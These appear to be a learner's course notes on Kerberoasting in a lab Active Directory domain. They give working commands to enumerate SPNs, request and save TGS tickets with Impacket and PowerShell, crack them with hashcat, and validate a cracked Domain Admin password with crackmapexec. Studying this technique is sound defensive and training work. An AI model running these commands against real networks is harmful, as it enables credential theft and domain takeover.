Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running.

Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`

 Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash)

Domain accounts running services are often local administrators, if not highly privileged domain accounts.

service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership.

*Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.*

Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.

## Kerberoasting with GetUserSPNs.py

> [!quote]
> 
> A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.


## Kerberoasting - Performing the Attack

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in *setspn.exe* Windows binary, *PowerShell*, and *Mimikatz*.
- From Windows, utilizing tools such as *PowerView*, [Rubeus](https://github.com/GhostPack/Rubeus), and other *PowerShell scripts*.


#### Listing SPN Accounts with GetUserSPNs.py

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

#### Requesting all TGS Tickets

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

#### Requesting a Single TGS ticket

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

#### Saving the TGS Ticket to an Output File

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

#### Cracking the Ticket Offline with Hashcat

```shell
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

#### Testing Authentication against a Domain Controller

```shell
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

found that sqldev is indeed a member of domain admin group , 
keberoasted the user and found the tgs 
then cracked it offline with hashcat 
then verified with crackmapexec to find if we can get a shell or not and the creds are valid

---

# Kerberoasting - from Windows

#### Enumerating SPNs with setspn.exe

```shell
setspn.exe -Q */*
```

We will notice many different SPNs returned for the various hosts in the domain.
We will focus on `user accounts` and ignore the computer accounts returned by the tool.
using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`

#### Targeting a Single User

```shell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) when using the default Kerberoasting method):

- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session


#### Retrieving All Tickets Using setspn.exe

```shell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
